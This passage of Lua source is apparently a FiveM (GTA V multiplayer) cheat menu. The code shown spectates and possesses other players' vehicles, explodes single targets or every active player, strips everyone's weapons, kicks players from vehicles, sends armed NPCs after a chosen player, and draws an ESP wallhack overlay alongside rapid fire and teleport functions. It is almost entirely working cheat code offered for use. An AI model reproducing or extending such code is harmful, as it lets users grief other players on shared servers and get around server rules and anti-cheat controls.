TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 14, 1) end if IsControlPressed(0, 172) and IsControlPressed(0, 173) then TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 30, 100) end if IsControlPressed(0, 174) and IsControlPressed(0, 172) then TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 7, 1) end if IsControlPressed(0, 175) and IsControlPressed(0, 172) then TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 8, 1) end if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 4, 1) end if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 5, 1) end end end
RCCar.DrawInstructions = function(distanceCheck) local steeringButtons = { { ["label"] = "Right", ["button"] = "~INPUT_CELLPHONE_RIGHT~" }, { ["label"] = "Forward", ["button"] = "~INPUT_CELLPHONE_UP~" }, { ["label"] = "Reverse", ["button"] = "~INPUT_CELLPHONE_DOWN~" }, { ["label"] = "Left", ["button"] = "~INPUT_CELLPHONE_LEFT~" } } local pickupButton = { ["label"] = "Delete", ["button"] = "~INPUT_VEH_DUCK~" } local explodeButton = { ["label"] = "Explode", ["button"] = "~INPUT_VEH_FLY_ROLL_LEFT_ONLY~" } local buttonsToDraw = { { ["label"] = "Toggle Camera", ["button"] = "~INPUT_DETONATE~" } } if distanceCheck <= 10000000.0 then for buttonIndex = 1, #steeringButtons do local steeringButton = steeringButtons[buttonIndex] table.insert(buttonsToDraw, steeringButton) end if distanceCheck <= 1000000.0 then table.insert(buttonsToDraw, explodeButton) end if distanceCheck <= 1000000.0 then table.insert(buttonsToDraw, pickupButton) end end Citizen.CreateThread(function() local instructionScaleform = RequestScaleformMovie("instructional_buttons") while not HasScaleformMovieLoaded(instructionScaleform) do Wait(0) end PushScaleformMovieFunction(instructionScaleform, "CLEAR_ALL") PushScaleformMovieFunction(instructionScaleform, "TOGGLE_MOUSE_BUTTONS") PushScaleformMovieFunctionParameterBool(0) PopScaleformMovieFunctionVoid() for buttonIndex, buttonValues in ipairs(buttonsToDraw) do PushScaleformMovieFunction(instructionScaleform, "SET_DATA_SLOT") PushScaleformMovieFunctionParameterInt(buttonIndex - 1) PushScaleformMovieMethodParameterButtonName(buttonValues["button"]) PushScaleformMovieFunctionParameterString(buttonValues["label"]) PopScaleformMovieFunctionVoid() end PushScaleformMovieFunction(instructionScaleform, "DRAW_INSTRUCTIONAL_BUTTONS") PushScaleformMovieFunctionParameterInt(-1) PopScaleformMovieFunctionVoid() DrawScaleformMovieFullscreen(instructionScaleform, 255, 255, 255, 255) end) end
RCCar.Spawn = function() RCCar.LoadModels({ GetHashKey(RCCAR123), 68070371 }) local spawnCoords, spawnHeading = GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0, GetEntityHeading(PlayerPedId()) RCCar.Entity = CreateVehicle(GetHashKey(RCCAR123), spawnCoords, spawnHeading, true) while not DoesEntityExist(RCCar.Entity) do Citizen.Wait(5) end
RCCar.Driver = CreatePed(5, 68070371, spawnCoords, spawnHeading, true) SetEntityInvincible(RCCar.Driver, true) SetEntityVisible(RCCar.Driver, false) FreezeEntityPosition(RCCar.Driver, true) SetPedAlertness(RCCar.Driver, 0.0) SetVehicleNumberPlateText(RCCar.Entity, "\70\97\108\99\111\110\10") TaskWarpPedIntoVehicle(RCCar.Driver, RCCar.Entity, -1) while not IsPedInVehicle(RCCar.Driver, RCCar.Entity) do Citizen.Wait(0) end RCCar.Attach("place") end
RCCar.Attach = function(param) if not DoesEntityExist(RCCar.Entity) then return end RCCar.LoadModels({ "pickup_object" }) if param == "place" then PlaceObjectOnGroundProperly(RCCar.Entity) elseif param == "pick" then if DoesCamExist(RCCar.Camera) then RCCar.ToggleCamera(false) end RCCar.Tablet(false) DeleteVehicle(RCCar.Entity) DeleteEntity(RCCar.Driver) RCCar.UnloadModels() end end
RCCar.Tablet = function(boolean) if boolean then Citizen.CreateThread(function() while DoesEntityExist(RCCar.TabletEntity) do Citizen.Wait(5) end ClearPedTasks(PlayerPedId()) end) else DeleteEntity(RCCar.TabletEntity) end end
ConfigCamera = true
RCCar.ToggleCamera = function(boolean) if not ConfigCamera then return end if boolean then if not DoesEntityExist(RCCar.Entity) then return end  if DoesCamExist(RCCar.Camera) then DestroyCam(RCCar.Camera) end RCCar.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true) AttachCamToEntity(RCCar.Camera, RCCar.Entity, 0.0, -7.5, 1.1, true) Citizen.CreateThread(function() while DoesCamExist(RCCar.Camera) do Citizen.Wait(5) SetCamRot(RCCar.Camera, GetEntityRotation(RCCar.Entity)) end end) local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10) RenderScriptCams(1, 1, easeTime, 1, 1) Citizen.Wait(easeTime) else local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10) RenderScriptCams(0, 1, easeTime, 1, 0) Citizen.Wait(easeTime) ClearTimecycleModifier() DestroyCam(RCCar.Camera) end end
RCCar.LoadModels = function(models) for modelIndex = 1, #models do local model = models[modelIndex] if not RCCar.CachedModels then RCCar.CachedModels = {} end table.insert(RCCar.CachedModels, model) if IsModelValid(model) then while not HasModelLoaded(model) do RequestModel(model) Citizen.Wait(10) end else while not HasAnimDictLoaded(model) do RequestAnimDict(model) Citizen.Wait(10) end end end end
RCCar.UnloadModels = function() for modelIndex = 1, #RCCar.CachedModels do local model = RCCar.CachedModels[modelIndex] if IsModelValid(model) then SetModelAsNoLongerNeeded(model) else RemoveAnimDict(model) end end end
local entityEnumerator = { __gc = function(enum) if enum.destructor and enum.handle then enum.destructor(enum.handle) end enum.destructor = nil enum.handle = nil end }

local function GetHeadItems()
    local headItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 0)
    local faceItemsList = {}
    for i = 1, headItems do
        faceItemsList[i] = i
    end
	return faceItemsList
end

local function GetHeadTextures(faceID)
    local headTextures = GetNumberOfPedTextureVariations(PlayerPedId(), 0, faceID)
	local headTexturesList = {}
    for i = 1, headTextures do
        headTexturesList[i] = i
    end
	return headTexturesList
end

local function GetHairItems()
    local hairItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 2)
    local hairItemsList = {}
    for i = 1, hairItems do
        hairItemsList[i] = i
    end
    return hairItemsList
end

local function GetHairTextures(hairID)
    local hairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, hairID)
    local hairTextureList = {}
    for i = 1, hairTexture do
        hairTextureList[i] = i
    end
    return hairTextureList
end

local function GetMaskItems()
    local maskItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 1)
    local maskItemsList = {}
    for i = 1, maskItems do
        maskItemsList[i] = i
    end
	return maskItemsList
end

local function GetHatItems()
    local hatItems = GetNumberOfPedPropDrawableVariations(PlayerPedId(), 0)
    local hatItemsList = {}
    for i = 1, hatItems do
        hatItemsList[i] = i
    end
	return hatItemsList
end

local function ClonePed(target) local ped = GetPlayerPed(target) local me = PlayerPedId() hat = GetPedPropIndex(ped, 0) hat_texture = GetPedPropTextureIndex(ped, 0) glasses = GetPedPropIndex(ped, 1) glasses_texture = GetPedPropTextureIndex(ped, 1) ear = GetPedPropIndex(ped, 2) ear_texture = GetPedPropTextureIndex(ped, 2) watch = GetPedPropIndex(ped, 6) watch_texture = GetPedPropTextureIndex(ped, 6) wrist = GetPedPropIndex(ped, 7) wrist_texture = GetPedPropTextureIndex(ped, 7) head_drawable = GetPedDrawableVariation(ped, 0) head_palette = GetPedPaletteVariation(ped, 0) head_texture = GetPedTextureVariation(ped, 0) beard_drawable = GetPedDrawableVariation(ped, 1) beard_palette = GetPedPaletteVariation(ped, 1) beard_texture = GetPedTextureVariation(ped, 1) hair_drawable = GetPedDrawableVariation(ped, 2) hair_palette = GetPedPaletteVariation(ped, 2) hair_texture = GetPedTextureVariation(ped, 2) torso_drawable = GetPedDrawableVariation(ped, 3) torso_palette = GetPedPaletteVariation(ped, 3) torso_texture = GetPedTextureVariation(ped, 3) legs_drawable = GetPedDrawableVariation(ped, 4) legs_palette = GetPedPaletteVariation(ped, 4) legs_texture = GetPedTextureVariation(ped, 4) hands_drawable = GetPedDrawableVariation(ped, 5) hands_palette = GetPedPaletteVariation(ped, 5) hands_texture = GetPedTextureVariation(ped, 5) foot_drawable = GetPedDrawableVariation(ped, 6) foot_palette = GetPedPaletteVariation(ped, 6) foot_texture = GetPedTextureVariation(ped, 6) acc1_drawable = GetPedDrawableVariation(ped, 7) acc1_palette = GetPedPaletteVariation(ped, 7) acc1_texture = GetPedTextureVariation(ped, 7) acc2_drawable = GetPedDrawableVariation(ped, 8) acc2_palette = GetPedPaletteVariation(ped, 8) acc2_texture = GetPedTextureVariation(ped, 8) acc3_drawable = GetPedDrawableVariation(ped, 9) acc3_palette = GetPedPaletteVariation(ped, 9) acc3_texture = GetPedTextureVariation(ped, 9) mask_drawable = GetPedDrawableVariation(ped, 10) mask_palette = GetPedPaletteVariation(ped, 10) mask_texture = GetPedTextureVariation(ped, 10) aux_drawable = GetPedDrawableVariation(ped, 11) aux_palette = GetPedPaletteVariation(ped, 11) aux_texture = GetPedTextureVariation(ped, 11) SetPedPropIndex(me, 0, hat, hat_texture, 1) SetPedPropIndex(me, 1, glasses, glasses_texture, 1) SetPedPropIndex(me, 2, ear, ear_texture, 1) SetPedPropIndex(me, 6, watch, watch_texture, 1) SetPedPropIndex(me, 7, wrist, wrist_texture, 1) SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette) SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette) SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette) SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette) SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette) SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette) SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette) SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette) SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette) SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette) SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette) SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette) end

local function cloneVehicle(target)
	local selectedPlayerVehicle = nil
	if IsPedInAnyVehicle(GetPlayerPed(target)) then selectedPlayerVehicle = GetVehiclePedIsIn(GetPlayerPed(target), false)
	else selectedPlayerVehicle = GetVehiclePedIsIn(GetPlayerPed(target), true) end

	if DoesEntityExist(selectedPlayerVehicle) then
		local vehicleModel = GetEntityModel(selectedPlayerVehicle)
		local spawnedVehicle = SpawnVehicleToPlayer(vehicleModel, PlayerId())

		local vehicleProperties = FiveM.GetVehicleProperties(selectedPlayerVehicle)
		props.plate = nil

		FiveM.SetVehicleProperties(spawnedVehicle, vehicleProperties)

		SetVehicleEngineOn(spawnedVehicle, true, false, false)
		SetVehRadioStation(spawnedVehicle, 'OFF')
	end
end

local function GetHatTextures(hatID)
	local hatTextures = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, hatID)
	local hatTexturesList = {}
	for i = 1, hatTextures do
        hatTexturesList[i] = i
    end
	return hatTexturesList
end

local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
    return coroutine.wrap(function()
        local iter, id = initFunc()
        if not id or id == 0 then
            disposeFunc(iter)
            return
        end
        
        local enum = {handle = iter, destructor = disposeFunc}
        setmetatable(enum, entityEnumerator)
        
        local next = true
        repeat
            coroutine.yield(id)
            next, id = moveFunc(iter)
        until not next
        
        enum.destructor, enum.handle = nil, nil
        disposeFunc(iter)
    end)
end

function EnumerateObjects()
    return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

function EnumerateVehicles()
    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

function EnumeratePickups()
    return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
end

function table.contains(table, element)
    for _, value in pairs(table) do
        if value == element then
            return true
        end
    end
    return false
end

function table.removekey(array, element)
    for i = 1, #array do
        if array[i] == element then
            table.remove(array, i)
        end
    end
end

function AddVectors(vect1, vect2)
    return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
end

function SubVectors(vect1, vect2)
    return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
end

function ScaleVector(vect, mult)
    return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
end

function round(num, numDecimalPlaces)
    local mult = 10 ^ (numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
end

local function GetKeyboardInput(text)
	if not text then text = "Input" end
    DisplayOnscreenKeyboard(0, "", "", "", "", "", "", 30)
    while (UpdateOnscreenKeyboard() == 0) do
		DrawTxt(text, 0.32, 0.37, 0.0, 0.4)
        DisableAllControlActions(0)
        -- Dont crash the menu when user hits esc
        if IsDisabledControlPressed(0, Keys["ESC"]) then return "" end
        Wait(0)
    end
    if (GetOnscreenKeyboardResult()) then
        local result = GetOnscreenKeyboardResult()
        Wait(0)
        return result
    end
end



function SpectatePlayer(id)
    local player = GetPlayerPed(id)
    if Spectating then
        RequestCollisionAtCoord(GetEntityCoords(player))
        NetworkSetInSpectatorMode(true, player)
        FiveM.Subtitle("You are now spectating ~b~" .. GetPlayerName(target))
    else
        RequestCollisionAtCoord(GetEntityCoords(player))
        NetworkSetInSpectatorMode(false, player)
		FiveM.Subtitle("You stopped spectating ~b~" .. GetPlayerName(target))
    end
end

local function PossessVehicle(target)
    PossessingVeh = not PossessingVeh
    
    if not PossessingVeh then
        SetEntityVisible(PlayerPedId(), true, 0)
        SetEntityCoords(PlayerPedId(), oldPlayerPos)
        SetEntityCollision(PlayerPedId(), true, 1)
    else
        SpectatePlayer(selectedPlayer)
        ShowInfo("~b~Checking Player...")
        Wait(3000)
        if IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
            SpectatePlayer(selectedPlayer)
            oldPlayerPos = GetEntityCoords(PlayerPedId())
            SetEntityVisible(PlayerPedId(), false, 0)
            SetEntityCollision(PlayerPedId(), false, 0)
        else
            SpectatePlayer(selectedPlayer)
            PossessingVeh = false
            ShowInfo("~r~Player not in a vehicle!  (Try again?)")
        end
        
        
        local Markerloc = nil
        

        Citizen.CreateThread(function()
            local ped = GetPlayerPed(target)
            local veh = GetVehiclePedIsIn(ped, 0)
            
            while PossessingVeh do
                
                DrawTxt("~b~Possessing ~w~" .. GetPlayerName(target) .. "'s ~b~Vehicle", 0.1, 0.05, 0.0, 0.4)
                DrawTxt("~b~Controls:\n~w~-------------------", 0.1, 0.2, 0.0, 0.4)
                DrawTxt("~b~W/S: ~w~Forward/Back\n~b~SPACEBAR: ~w~Up\n~b~CTRL: ~w~Down\n~b~X: ~w~Cancel", 0.1, 0.25, 0.0, 0.4)
                Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
                DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 0, 0, 180, 35, false, true, 2, nil, nil, false)
                
                local forward = SubVectors(Markerloc, GetEntityCoords(veh))
                local vpos = GetEntityCoords(veh)
                local vf = GetEntityForwardVector(veh)
                local vrel = SubVectors(vpos, vf)
                
                SetEntityCoords(PlayerPedId(), vrel.x, vrel.y, vpos.z + 1.1)
                SetEntityNoCollisionEntity(PlayerPedId(), veh, 1)
                
                RequestControlOnce(veh)
                
                if IsDisabledControlPressed(0, Keys["W"]) then
                    ApplyForce(veh, forward * 0.1)
                end
                
                if IsDisabledControlPressed(0, Keys["S"]) then
                    ApplyForce(veh, -(forward * 0.1))
                end
                
                if IsDisabledControlPressed(0, Keys["SPACE"]) then
                    ApplyForceToEntity(veh, 3, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                end
                
                if IsDisabledControlPressed(0, Keys["LEFTCTRL"]) then
                    ApplyForceToEntity(veh, 3, 0.0, 0.0, -1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                end
                
                if IsDisabledControlPressed(0, Keys["X"]) or GetEntityHealth(PlayerPedId()) < 5.0 then
                    PossessingVeh = false
                    SetEntityVisible(PlayerPedId(), true, 0)
                    SetEntityCoords(PlayerPedId(), oldPlayerPos)
                    SetEntityCollision(PlayerPedId(), true, 1)
                end
                
                Wait(0)
            end
        end)
    end
end

function GetWeaponNameFromHash(hash)
    for i = 1, #allweapons do
        if GetHashKey(allweapons[i]) == hash then
            return string.sub(allweapons[i], 8)
        end
    end
end

local function FixVeh(veh)
    SetVehicleEngineHealth(veh, 1000)
    SetVehicleFixed(veh)
end

local function ExplodePlayer(target)
    local ped = GetPlayerPed(target)
    local coords = GetEntityCoords(ped)
    AddExplosion(coords.x + 1, coords.y + 1, coords.z + 1, 4, 100.0, true, false, 0.0)
end

local function ExplodeAll(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        ExplodePlayer(i)
    end
end


local function PedAttack(target, attackType)
    local coords = GetEntityCoords(GetPlayerPed(target))
    
    if attackType == 1 then weparray = allweapons
    elseif attackType == 2 then weparray = meleeweapons
    elseif attackType == 3 then weparray = pistolweapons
    elseif attackType == 4 then weparray = heavyweapons
    end
    
    for k in EnumeratePeds() do
        if k ~= GetPlayerPed(target) and not IsPedAPlayer(k) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) < 2000 then
            local rand = math.ceil(math.random(#weparray))
            if weparray ~= allweapons then GiveWeaponToPed(k, GetHashKey(weparray[rand][1]), 9999, 0, 1)
            else GiveWeaponToPed(k, GetHashKey(weparray[rand]), 9999, 0, 1) end
            ClearPedTasks(k)
            TaskCombatPed(k, GetPlayerPed(target), 0, 16)
            SetPedCombatAbility(k, 100)
            SetPedCombatRange(k, 2)
            SetPedCombatAttributes(k, 46, 1)
            SetPedCombatAttributes(k, 5, 1)
        end
    end
end


function ApplyShockwave(entity)
    local pos = GetEntityCoords(PlayerPedId())
    local coord = GetEntityCoords(entity)
    local dx = coord.x - pos.x
    local dy = coord.y - pos.y
    local dz = coord.z - pos.z
    local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
    local distanceRate = (50 / distance) * math.pow(1.04, 1 - distance)
    ApplyForceToEntity(entity, 1, distanceRate * dx, distanceRate * dy, distanceRate * dz, math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), true, false, true, true, true, true)
end

local function DoForceFieldTick(radius)
    local player = PlayerPedId()
    local coords = GetEntityCoords(PlayerPedId())
    local playerVehicle = GetPlayersLastVehicle()
    local inVehicle = IsPedInVehicle(player, playerVehicle, true)
    
    DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, 180, 80, 0, 35, false, true, 2, nil, nil, false)
    
    for k in EnumerateVehicles() do
        if (not inVehicle or k ~= playerVehicle) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
            RequestControlOnce(k)
            ApplyShockwave(k)
        end
    end
    
    for k in EnumeratePeds() do
        if k ~= PlayerPedId() and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
            RequestControlOnce(k)
            SetPedRagdollOnCollision(k, true)
            SetPedRagdollForceFall(k)
            ApplyShockwave(k)
        end
    end
end

local function DoRapidFireTick()
    DisablePlayerFiring(PlayerPedId(), true)
    if IsDisabledControlPressed(0, Keys["MOUSE1"]) then
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
        local camDir = GetCamDirFromScreenCenter()
        local camPos = GetGameplayCamCoord()
        local launchPos = GetEntityCoords(wepent)
        local targetPos = camPos + (camDir * 200.0)
        
        ClearAreaOfProjectiles(launchPos, 0.0, 1)
        
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
    end
end

if ShowEsp then
    for i = 0, 128 do
        if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
            local pPed = GetPlayerPed(i)
            local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
            local x, y, z = table.unpack(GetEntityCoords(pPed))
            local message = "Name: " .. FiveM.GetSafePlayerName(GetPlayerName(i)) .. "\nServer ID: " .. GetPlayerServerId(i) .. "\nPlayer ID: " .. i ..
                                "\nDist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, true), 1)
            if IsPedInAnyVehicle(pPed) then
                local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(pPed))))
                message = message .. "\nVeh: " .. VehName
            end
            if ShowEspInfo and ShowEsp then DrawText3D(x, y, z + 1.0, message, Maincolor.r, Maincolor.g, Maincolor.b) end
            if ShowEspOutline and ShowEsp then
                local PedCoords = GetOffsetFromEntityInWorldCoords(pPed)
                LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

                TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

                ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                DrawLine(LineOneBegin.x, LineOneBegin.y, LineOneBegin.z, LineOneEnd.x, LineOneEnd.y, LineOneEnd.z, Maincolor.r, Maincolor.g, Maincolor.b, 255)
                DrawLine(LineTwoBegin.x, LineTwoBegin.y, LineTwoBegin.z, LineTwoEnd.x, LineTwoEnd.y, LineTwoEnd.z, Maincolor.r, Maincolor.g, Maincolor.b, 255)
                DrawLine(LineThreeBegin.x, LineThreeBegin.y, LineThreeBegin.z, LineThreeEnd.x, LineThreeEnd.y, LineThreeEnd.z, Maincolor.r, Maincolor.g, Maincolor.b, 255)
                DrawLine(LineThreeEnd.x, LineThreeEnd.y, LineThreeEnd.z, LineFourBegin.x, LineFourBegin.y, LineFourBegin.z, Maincolor.r, Maincolor.g, Maincolor.b, 255)
                DrawLine(TLineOneBegin.x, TLineOneBegin.y, TLineOneBegin.z, TLineOneEnd.x, TLineOneEnd.y, TLineOneEnd.z, Maincolor.r, Maincolor.g, Maincolor.b, 255)
                DrawLine(TLineTwoBegin.x, TLineTwoBegin.y, TLineTwoBegin.z, TLineTwoEnd.x, TLineTwoEnd.y, TLineTwoEnd.z, Maincolor.r, Maincolor.g, Maincolor.b, 255)
                DrawLine(TLineThreeBegin.x, TLineThreeBegin.y, TLineThreeBegin.z, TLineThreeEnd.x, TLineThreeEnd.y, TLineThreeEnd.z, Maincolor.r, Maincolor.g, Maincolor.b, 255)
                DrawLine(TLineThreeEnd.x, TLineThreeEnd.y, TLineThreeEnd.z, TLineFourBegin.x, TLineFourBegin.y, TLineFourBegin.z, Maincolor.r, Maincolor.g, Maincolor.b, 255)
                DrawLine(ConnectorOneBegin.x, ConnectorOneBegin.y, ConnectorOneBegin.z, ConnectorOneEnd.x, ConnectorOneEnd.y, ConnectorOneEnd.z, Maincolor.r, Maincolor.g, Maincolor.b, 255)
                DrawLine(ConnectorTwoBegin.x, ConnectorTwoBegin.y, ConnectorTwoBegin.z, ConnectorTwoEnd.x, ConnectorTwoEnd.y, ConnectorTwoEnd.z, Maincolor.r, Maincolor.g, Maincolor.b, 255)
                DrawLine(ConnectorThreeBegin.x, ConnectorThreeBegin.y, ConnectorThreeBegin.z, ConnectorThreeEnd.x, ConnectorThreeEnd.y, ConnectorThreeEnd.z, Maincolor.r, Maincolor.g, Maincolor.b, 255)
                DrawLine(ConnectorFourBegin.x, ConnectorFourBegin.y, ConnectorFourBegin.z, ConnectorFourEnd.x, ConnectorFourEnd.y, ConnectorFourEnd.z, Maincolor.r, Maincolor.g, Maincolor.b, 255)
            end
            if ShowEspLines and ShowEsp then DrawLine(cx, cy, cz, x, y, z, Maincolor.r, Maincolor.g, Maincolor.b, 255) end
        end
    end
end

local function StripPlayer(target)
    local ped = GetPlayerPed(target)
    RemoveAllPedWeapons(ped, false)
end

local function StripAll(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        StripPlayer(i)
    end
end

local function KickFromVeh(target)
    local ped = GetPlayerPed(target)
    if IsPedInAnyVehicle(ped, false) then
        ClearPedTasksImmediately(ped)
    end
end

local function KickAllFromVeh(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        KickFromVeh(i)
    end
end

local function CancelAnimsAll(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        ClearPedTasksImmediately(GetPlayerPed(plist[i]))
    end
end

local function RandomClothes(target)
    local ped = GetPlayerPed(target)
    SetPedRandomComponentVariation(ped, false)
    SetPedRandomProps(ped)
end

local function GiveAllWeapons(target)
    local ped = GetPlayerPed(target)
    for i = 0, #allweapons do
        GiveWeaponToPed(ped, GetHashKey(allweapons[i]), 9999, false, false)
    end
end

local function GiveAllPlayersWeapons(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        GiveAllWeapons(i)
    end
end

local function GiveWeapon(target, weapon)
    local ped = GetPlayerPed(target)
    GiveWeaponToPed(ped, GetHashKey(weapon), 9999, false, false)
end

local function GiveMaxAmmo(target)
    local ped = GetPlayerPed(target)
    for i = 1, #allweapons do
        AddAmmoToPed(ped, GetHashKey(allweapons[i]), 9999)
    end
end

local function TeleportToPlayer(target)
    local ped = GetPlayerPed(target)
    local pos = GetEntityCoords(ped)
    SetEntityCoords(PlayerPedId(), pos)
end

local function TeleportToWaypoint()
    local entity = PlayerPedId()
    if IsPedInAnyVehicle(entity, false) then
        entity = GetVehiclePedIsUsing(entity)
    end
    local success = false
    local blipFound = false
    local blipIterator = GetBlipInfoIdIterator()
    local blip = GetFirstBlipInfoId(8)
    
    while DoesBlipExist(blip) do
        if GetBlipInfoIdType(blip) == 4 then
            cx, cy, cz = table.unpack(Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()))
            blipFound = true
            break
        end
        blip = GetNextBlipInfoId(blipIterator)
        Wait(0)
    end
    
    if blipFound then
        local groundFound = false
        local yaw = GetEntityHeading(entity)
        
        for i = 0, 1000, 1 do
            SetEntityCoordsNoOffset(entity, cx, cy, ToFloat(i), false, false, false)
            SetEntityRotation(entity, 0, 0, 0, 0, 0)
            SetEntityHeading(entity, yaw)
            SetGameplayCamRelativeHeading(0)
            Wait(0)
            if GetGroundZFor_3dCoord(cx, cy, ToFloat(i), cz, false) then
                cz = ToFloat(i)
                groundFound = true
                break
            end
        end
        if not groundFound then
            cz = -300.0
        end
        success = true
    else
        FiveM.Notify("~r~Waypoint missing!", NotificationType.Error)
    end
    
    if success then
        SetEntityCoordsNoOffset(entity, cx, cy, cz, false, false, true)
        SetGameplayCamRelativeHeading(0)
        if IsPedSittingInAnyVehicle(PlayerPedId()) then
            if GetPedInVehicleSeat(GetVehiclePedIsUsing(PlayerPedId()), -1) == PlayerPedId() then
                SetVehicleOnGroundProperly(GetVehiclePedIsUsing(PlayerPedId()))
            end
        end
    end

end

local function ToggleGodmode(tog)
